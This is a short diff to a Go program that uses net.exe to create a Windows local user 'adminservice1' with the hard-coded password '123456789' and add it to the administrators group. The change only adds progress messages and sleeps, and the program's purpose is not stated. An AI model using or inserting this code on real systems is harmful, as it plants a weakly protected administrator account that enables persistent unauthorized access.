@@ -3,11 +3,14 @@ package main
 import (
 	"log"
 	"os/exec"
+	"time"
 )
 
 func main() {
 	const username = "adminservice1"
 	const password = "123456789"
+
+	println("creating local user")
 
 	//First create the user
 	cmd1 := exec.Command("net.exe", "user", username, password, "/add")
@@ -17,6 +20,10 @@ func main() {
 		log.Fatal(err1)
 	}
 
+	time.Sleep(3 * time.Second)
+
+	println("add local user to admin group")
+
 	//Second add the user to the local admins group
 	cmd2 := exec.Command("net.exe", "localgroup", "administrators", username, "/add")
 	err2 := cmd2.Run()
@@ -24,4 +31,5 @@ func main() {
 	if err2 != nil {
 		log.Fatal(err2)
 	}
+	time.Sleep(3 * time.Second)
 }
